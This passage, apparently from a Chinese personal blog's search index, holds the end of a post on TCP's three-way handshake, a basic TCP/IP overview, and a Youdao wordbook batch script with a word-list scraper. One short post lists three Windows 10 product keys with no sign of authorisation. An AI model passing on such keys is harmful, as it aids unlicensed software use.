连接的发起方可以通过保存发出的序列号判断连接是否过期，如果让接收方来保存并判断序列号却是不现实的，这也再一次强化了我们在上一节中提出的观点 —— 避免历史错连接的初始化。 通信次数当我们讨论 TCP 建立连接需要的通信次数时，我们经常会执着于为什么通信三次才可以建立连接，而不是两次或者四次；讨论使用更多的通信次数来建立连接往往是没有意义的，因为我们总可以使用更多的通信次数交换相同的信息，所以使用四次、五次或者更多次数建立连接在技术上都是完全可以实现的。 这种增加 TCP 连接通信次数的问题往往没有讨论的必要性，我们追求的其实是用更少的通信次数（理论上的边界）完成信息的交换，也就是为什么我们在上两节中也一再强调使用『两次握手』没有办法建立 TCP 连接，使用三次握手是建立连接所需要的最小次数。 总结我们在这篇文章中讨论了为什么 TCP 建立连接需要经过三次握手，在具体分析这个问题之前，我们首先重新思考了 TCP 连接究竟是什么，RFC 793 - Transmission Control Protocol - IETF Tools 对 TCP 连接有着非常清楚的定义 —— 用于保证可靠性和流控制机制的数据，包括 Socket、序列号以及窗口大小。 TCP 建立连接时通过三次握手可以有效地避免历史错误连接的建立，减少通信双方不必要的资源消耗，三次握手能够帮助通信双方获取初始化序列号，它们能够保证数据包传输的不重不丢，还能保证它们的传输顺序，不会因为网络传输的问题发生混乱，到这里不使用『两次握手』和『四次握手』的原因已经非常清楚了： 『两次握手』：无法避免历史错误连接的初始化，浪费接收方的资源； 『四次握手』：TCP 协议的设计可以让我们同时传递 ACK 和 SYN 两个控制信息，减少了通信次数，所以不需要使用更多的通信次数传输相同的信息； 我们重新回到在文章开头提的问题，为什么使用类比解释 TCP 使用三次握手是错误的？这主要还是因为，这个类比没有解释清楚核心问题 —— 避免历史上的重复连接。到最后，我们还是来看一些比较开放的相关问题，有兴趣的读者可以仔细想一下下面的问题： 除了使用序列号是否还有其他方式保证消息的不重不丢？ UDP 协议有连接的概念么，它能保证数据传输的可靠么？ 如果对文章中的内容有疑问或者想要了解更多软件工程上一些设计决策背后的原因，可以在博客下面留言，作者会及时回复本文相关的疑问并选择其中合适的主题作为后续的内容。 Reference RFC 793 - Transmission Control Protocol - IETF Tools Why do we need a 3-way handshake? Why not just 2-way?","link":"/2020/08/20/tcp-handshake/"},{"title":"Windows Collections","text":"##windows 10 license licenseWin10专业版 7M2H3-J3VPB-2X2DK-33CC2-CHPH4 ​Win10 企业版：XCBWP-GN2BX-QJDYV-XQV7K-C7JWR Win10专业版：V942D-C7NFG-773PY-MT398-F3KTY Collection up to spare","link":"/2018/11/22/windows-collections/"},{"title":"有道生词本的批量处理","text":"近期有个需求是需要将自己的生词和“The Oxford 5000”批量导入有道词典的生词本。 批量添加生词 通过构造xml的方式来直接导入生词本，但是通过这种方式添加到生词本之后，单独查看生词本是没有发音和翻译的。我需要发音和翻译，以此用于打印和反复记忆。 通过web端的添加生词，进行抓包，使用请求来批量添加生词,需要传入格林威治标准时间。 12345678910111213141516def get_gmt_time(): GMT_FORMAT = '%a %b %d %Y %H:%M:%S GMT' a = str(datetime.datetime.now().strftime(GMT_FORMAT)) + \"0800 (中国标准时间)\" return adef add_word(word): gmt = get_gmt_time() url = \"http://dict.youdao.com/wordbook/ajax?action=addword&amp;q=\"+ str(word) +\"&amp;date=\" +str(gmt)+ \"&amp;le=eng\" headers = { 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36', 'X-Requested-With': 'XMLHttpRequest', 'Cookie': YOUR COOKIE HERE } response = requests.get(url, headers=headers) print(response.text) 到这里已经可以批量添加生词了。 批量导出生词如果需要将生词到处并进行打印，使用有道词典pc客户端导出生词的话，每次只能导出200个单词，无论你的分组里面有多少单词。 通过web端的有道单词本可以看到所有的生词，通过开发者模式开到有个接口是来限制每页显示生词数量的。 http://youdao.com/wordbook/webapi/words?limit=15&amp;offset=0 直接修改limit的数量，接口返回的json数据便是我们想要的内容，数据是包含发音和翻译的。 123456789101112131415{ &quot;code&quot;: 0, &quot;msg&quot;: &quot;SUCCESS&quot;, &quot;data&quot;: { &quot;total&quot;: 4963, &quot;itemList&quot;: [ { &quot;itemId&quot;: &quot;1c82fc32a3923d2a1f77b0dae96f48f7&quot;, &quot;bookId&quot;: &quot;5ea3ec6b6c7f497d91796063366efeb0&quot;, &quot;bookName&quot;: &quot;oxford5000&quot;, &quot;word&quot;: &quot;AIDS&quot;, &quot;trans&quot;: &quot;abbr. 获得性免疫缺乏综合征；艾滋病（Acquired Immune Deficiency Syndrome）&quot;, &quot;phonetic&quot;: &quot;eɪdz&quot;, &quot;modifiedTime&quot;: 1598351070000 }.... 直接对数据进行解析处理即可。 如果要进行打印，考虑到字体和分栏等问题，word调整了好久都无法达到满意效果，因为翻译的长度不是统一的，可以使用jinja2写个html简单渲染一下。或者放到excel中进行简单调整，即可达到我们想要的效果。 附The Oxford 3000/5000 的单词爬取脚本 1234567891011121314151617181920def get_word(): headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36' } url = 'https://www.oxfordlearnersdictionaries.com/wordlists/oxford3000-5000' req = requests.get(url,headers=headers) html = req.text soup = BeautifulSoup(html,'lxml') ul = soup.find('ul',class_=\"top-g\") for x in ul: try: word = x.select('li &gt; a') except Exception as e: pass else: if word: result.append(word[0].text) result.sort() res = set(result) return res","link":"/2020/08/27/youdao-dict/"},{"title":"TCP/IP基础知识总结","text":"我们接触计算机网络最多的协议，那就是TCP/IP协议了，TCP/IP协议同时也是互联网中最为著名的协议。 TCP/IP的历史背景最初还没有TCP/IP协议的时候，也就是再20世纪60年代，许多国家和地区认识到通信技术的重要性。美国国防部希望能够研究一种即时通信线路被破坏也能够通过其他路线进行通信的技术。为了实现这种技术，出现了分组网络。 即使再两个节点通信的过程中，几个节点遭到破坏，却依然能够通过改变线路等方式使得两个节点之间进行通信。 这种分组网络促使了ARPANET（advanced Research Projects Agency Network）的诞生。ARPANET是第一个具有分布式控制的广域包分t组交换网络，也是最早实现TCP/IP协议的前身。 以上协议汇总起来，就是TCP/IP协议蔟。 TCP/IP标准TCP/IP 相较于其他的协议标准，更注重开放性和实用性，即标准能否被实际应用。TCP/IP标准协议就是我们班所熟知的RFC文档，RFC不仅规范了协议标准还包含了协议的实现和使用信息。 More about RFC TCP/IP协议簇OSI模型一共有七层，从下到上分别是物理层，数据链路层，网络层，传输层(运输层)，会话层，表示层和应用层。 简化为：应用层，传输层，网络层，通信链路层。 我们从通信链路层开始介绍一下这些系一层以及层之间的协议。 通信链路层如果非要细分的话，通信链路层也可以分为物理层和数据链路层。 物理层物理层是TCP/IP的最底层是负责传输的硬件，这种哦硬件就相当于是以太网或者电话线路等物理层的设备。 数据链路层数据链路层位于物理层和网络层中间，数据链路层定义了在单个链路上如何传输数据。 网络层网络层主要使用IP协议，IP协议基于IP地址转发分包数据。 IP协议的主要作用就是将分组数据包发送到目标主机。TCP/IP 分层中的互联网层与传输层的功能通常由操作系统提供。IP协议还隐含着数据链路层的功能，通过IP协议，相互通信的主机之间不论经过怎样的数据链路，都能够实现相互通信。虽然IP也是一种分组交换协议，但是IP协议却不具备重发机制。及时数据没有到达另一端也不会进行重发，所以IP属于非可靠性协议。 网络层还有一种协议就是ICMP，因为IP协议在数据包的发送过程中可能会出现异常，当IP数据包因为异常而无法到达目标地址时，需要给发送端发送一个异常通知，ICMP的主要功能就在于此，ICMP也可以被用来诊断网络状况。 传输层TCP协议是传输层协议的一种 传输层就像高速公路一样，连接两个城市的道路。它的主要功能是让应用层的应用程序之间完成通信和数据交换。在计算机内部运行着很多应用程序，每个应用程序对应一个端口号，我们一般使用端口号来区分这些应用程序。 传输层的协议主要分为面向有连接的协议TCP和面向无连接的协议UDP TCPTCP是一种可靠的协议，它能够保证数据包的可靠性交付，TCP能够正确处理传输过程中的丢包、传输顺序错乱等异常情况。此外，TCP还提供拥塞控制用于缓解网络拥堵。 UDPUDP是一种不可靠协议，它无法保证数据的可靠交付，相比TCP，UDP不会检查数据包是否到达，网络是否阻塞等情况，但是UDP的效率比较高。 UDP协议常用于分组数据较少或者广播，多播等视频通信和多媒体领域。 应用层在TCP/IP协议簇中，将OSI标准模型中的会话层，表示层都归为应用层。应用层的架构大多属于客户端/服务端模型。在这种架构中，服务端通常会提前部署到服务器上，等待客户端的连接，从而提供服务。 数据包的发送过程数据包结构 在每一层中，都会对所发送的数据增加一个头 ，这个头中包含了该层必要的信息。每一层都会对数据进行处理并在数据包中附上这一层的必要信息。 应用层的处理主机A打开某应用程序，或者打开聊天窗口输入Hello，点击发送，那么这个Hello就作为一个数据包遨游在网络中，首先应用层会对这个数据包进行处理，包括字符编码、格式化等等，这其实是OSI中表现层的工作，只不过在TCP/IP协议中都归为了应用层。数据包在发送的那一刻建立TCP连接，这个连接相当于通道，在这之后其他数据包也会使用通道传输数据。 传输层的处理为了描述信息能够准确的到达另一方，我们使用TCP协议来进行描述。TCP会根据应用的指示，负责建立连接，发送数据和断开连接。 TCP会在应用数据层的前端附加一个TCP的头部字段，TCP头部包含了源端口号和目标端口号，这两个端口号用于表明数据包是从哪里发出的，需要发送到哪个应用程序上；TCP头部还包含序号，用于表示该包中数据是发送端整个数据中的第几个字节的序列号；TCP头部还包含校验和，用于判断数据是否损坏，随后将TCP头部附加在数据包的头部发送给IP 网络层的处理网络层主要负责处理数据包的是IP协议，IP协议将TCP传过来的TCP头部和数据结合当作自己的数据，并在TCP头部的前端加上自己的IP头部。因此，IP数据包后面会紧跟着TCP数据包，后面才是数据本身。IP头部包含目标地址和源地址，紧随在IP头部的还有用来判断后面是TCP还是UDP的信息。 IP包生成后，会由路由控制表判断应该发送到哪个主机，IP修饰后的数据继续向下发送给路由器或者网络接口的驱动程序，从而实现真正的数据传输。 通信链路层的处理经由IP传过来的数据包，以太网会给数据包附上以太网的头部信息并进行发送处理。以太网头部信息包含接收端的MAC地址、发送端的MAC地址以及以太网类型的以太网数据协议等。 以下是完整的处理过程和解析过程。 左侧是数据的发送处理过程，应用层数据经过层层处理后变为可以发送昂的数据包，经过物理介质发送到指定主机中。 数据包的接收流程是发送流程的逆序过程，数据包的解析同样会经过下面这几步。 通信链路的解析目标主机收到数据包后，首选会从以太网的头部找到MAC地址判断是否是发给自己的数据包，如果不是发给自己的数据包则会丢弃该数据包。 如果收到的数据包是发送给自己的，就会查找以太网类型判断是那种协议，如果是IP协议就会扔给IP协议进行处理。如果是ARP协议就会给ARP协议进行处理。如果协议类型是一宗无法识别的协议，就会将该数据包直接丢弃。 网络层的解析经过以太网处理后的数据包扔给网络层进行处理，我们假设协议类型是IP协议，那么，在IP收到数据包后就会解析IP头部信息，判断IP头部信息中的IP地址是否和自己的IP地址匹配，如果匹配则接受数据并判断上一层协议是TCP还是UDP，如果不匹配则直接丢弃。 在路由的转发过程中，有的时候IP地址并不是自己的，这个时候需要借助路由表协助处理。 传输层的处理在传输层中，我们默认使用TCP协议，在TCP处理过程中，首先会计算一下校验和，判断数据是否被损坏。然后检查是否按照序号接受数据，最后检查端口号，确定具体是哪个应用程序。 数据被完整识别后，会传递给由端口号识别的应用程序进行处理。 应用程序的处理接收端指定的应用程序会处理发送方传递过来的数据，通过解码等操作识别出数据的内容，然后把对应的数据存储在磁盘上，返回一个保存成功的消息给发送方，如果保存失败，则返回错误消息。 数据包经过每层后，该层协议都会在数据包附上头部信息。 在数据包的发送过程中，各层以此对数据包添加了头部信息，每个头部都包含发送端和接收端地址以及上一层的协议类型。以太网会使用MAC地址，IP会用IP地址，TCP/UDP则会用端口号作为识别两端主机的地址。 每个分层的包首部还包含一个识别位，它是用来标识上一层协议的种类信息。","link":"/2020/11/05/tcpip/"}],"tags":[{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"collect","slug":"collect","link":"/tags/collect/"},{"name":"Android","slug":"Android","link":"/tags/Android/"},{"name":"Shell","slug":"Shell","link":"/tags/Shell/"},{"name":"MatPlotlib","slug":"MatPlotlib","link":"/tags/MatPlotlib/"},{"name":"Raspberry","slug":"Raspberry","link":"/tags/Raspberry/"},{"name":"Jieba","slug":"Jieba","link":"/tags/Jieba/"},{"name":"BeautifulSoup","slug":"BeautifulSoup","link":"/tags/BeautifulSoup/"},{"name":"ebook,kindle,collect","slug":"ebook-kindle-collect","link":"/tags/ebook-kindle-collect/"},{"name":"DNS","slug":"DNS","link":"/tags/DNS/"},{"name":"md5,bcrypt,hash,sha256,sha512,密码学,哈希算法,security","slug":"md5-bcrypt-hash-sha256-sha512-密码学-哈希算法-security","link":"/tags/md5-bcrypt-hash-sha256-sha512-%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95-security/"},{"name":"micropython,esp8266,Oled,collect","slug":"micropython-esp8266-Oled-collect","link":"/tags/micropython-esp8266-Oled-collect/"},{"name":"markdown,fontawesome,collect","slug":"markdown-fontawesome-collect","link":"/tags/markdown-fontawesome-collect/"},{"name":"Test","slug":"Test","link":"/tags/Test/"},{"name":"security","slug":"security","link":"/tags/security/"},{"name":"podcast,study,collect","slug":"podcast-study-collect","link":"/tags/podcast-study-collect/"},{"name":"Python,Pyinstaller","slug":"Python-Pyinstaller","link":"/tags/Python-Pyinstaller/"},{"name":"python,raspberry,collect","slug":"python-raspberry-collect","link":"/tags/python-raspberry-collect/"},{"name":"python,wechat,collect","slug":"python-wechat-collect","link":"/tags/python-wechat-collect/"},{"name":"javascript,study,collect","slug":"javascript-study-collect","link":"/tags/javascript-study-collect/"},{"name":"Tools","slug":"Tools","link":"/tags/Tools/"},{"name":"live","slug":"live","link":"/tags/live/"},{"name":"Ubuntu","slug":"Ubuntu","link":"/tags/Ubuntu/"},{"name":"install","slug":"install","link":"/tags/install/"},{"name":"ssr,shadow,collect","slug":"ssr-shadow-collect","link":"/tags/ssr-shadow-collect/"},{"name":"baidu,data,collect","slug":"baidu-data-collect","link":"/tags/baidu-data-collect/"},{"name":"network,tcp,handshake","slug":"network-tcp-handshake","link":"/tags/network-tcp-handshake/"},{"name":"windows,license,collect","slug":"windows-license-collect","link":"/tags/windows-license-collect/"},{"name":"Python,word","slug":"Python-word","link":"/tags/Python-word/"},{"name":"basic,protocol,network","slug":"basic-protocol-network","link":"/tags/basic-protocol-network/"}],"categories":[{"name":"docs","slug":"docs","link":"/categories/docs/"},{"name":"index","slug":"docs/index","link":"/categories/docs/index/"},{"name":"python","slug":"docs/python","link":"/categories/docs/python/"},{"name":"Android","slug":"docs/Android","link":"/categories/docs/Android/"},{"name":"Raspberry","slug":"docs/Raspberry","link":"/categories/docs/Raspberry/"},{"name":"index","slug":"docs/python/index","link":"/categories/docs/python/index/"},{"name":"ebook","slug":"ebook","link":"/categories/ebook/"},{"name":"collections","slug":"docs/collections","link":"/categories/docs/collections/"},{"name":"index","slug":"docs/Android/index","link":"/categories/docs/Android/index/"},{"name":"security","slug":"docs/security","link":"/categories/docs/security/"},{"name":"Android","slug":"docs/Raspberry/Android","link":"/categories/docs/Raspberry/Android/"},{"name":"micropython","slug":"micropython","link":"/categories/micropython/"},{"name":"markdown","slug":"markdown","link":"/categories/markdown/"},{"name":"test","slug":"docs/test","link":"/categories/docs/test/"},{"name":"podcast","slug":"docs/podcast","link":"/categories/docs/podcast/"},{"name":"raspberry","slug":"docs/raspberry","link":"/categories/docs/raspberry/"},{"name":"micropython","slug":"docs/micropython","link":"/categories/docs/micropython/"},{"name":"index","slug":"ebook/index","link":"/categories/ebook/index/"},{"name":"javascript","slug":"docs/javascript","link":"/categories/docs/javascript/"},{"name":"index","slug":"docs/collections/index","link":"/categories/docs/collections/index/"},{"name":"Tools","slug":"docs/index/Tools","link":"/categories/docs/index/Tools/"},{"name":"live","slug":"docs/live","link":"/categories/docs/live/"},{"name":"system","slug":"docs/system","link":"/categories/docs/system/"},{"name":"ssr","slug":"ssr","link":"/categories/ssr/"},{"name":"baidu","slug":"baidu","link":"/categories/baidu/"},{"name":"Raspberry","slug":"docs/python/index/Raspberry","link":"/categories/docs/python/index/Raspberry/"},{"name":"basic","slug":"docs/basic","link":"/categories/docs/basic/"},{"name":"license","slug":"license","link":"/categories/license/"},{"name":"index","slug":"docs/security/index","link":"/categories/docs/security/index/"},{"name":"index","slug":"docs/Raspberry/Android/index","link":"/categories/docs/Raspberry/Android/index/"},{"name":"index","slug":"micropython/index","link":"/categories/micropython/index/"},{"name":"index","slug":"markdown/index","link":"/categories/markdown/index/"},{"name":"collection","slug":"docs/test/collection","link":"/categories/docs/test/collection/"},{"name":"index","slug":"docs/podcast/index","link":"/categories/docs/podcast/index/"},{"name":"index","slug":"docs/raspberry/index","link":"/categories/docs/raspberry/index/"},{"name":"esp8266","slug":"docs/micropython/esp8266","link":"/categories/docs/micropython/esp8266/"},{"name":"index","slug":"docs/javascript/index","link":"/categories/docs/javascript/index/"},{"name":"memory","slug":"docs/live/memory","link":"/categories/docs/live/memory/"},{"name":"index","slug":"docs/system/index","link":"/categories/docs/system/index/"},{"name":"python","slug":"ssr/python","link":"/categories/ssr/python/"},{"name":"index","slug":"baidu/index","link":"/categories/baidu/index/"},{"name":"Cloudflare","slug":"docs/python/index/Raspberry/Cloudflare","link":"/categories/docs/python/index/Raspberry/Cloudflare/"},{"name":"index","slug":"docs/basic/index","link":"/categories/docs/basic/index/"},{"name":"windows","slug":"license/windows","link":"/categories/license/windows/"},{"name":"index","slug":"docs/test/collection/index","link":"/categories/docs/test/collection/index/"},{"name":"index","slug":"docs/micropython/esp8266/index","link":"/categories/docs/micropython/esp8266/index/"},{"name":"index","slug":"ssr/python/index","link":"/categories/ssr/python/index/"},{"name":"index","slug":"license/windows/index","link":"/categories/license/windows/index/"}]}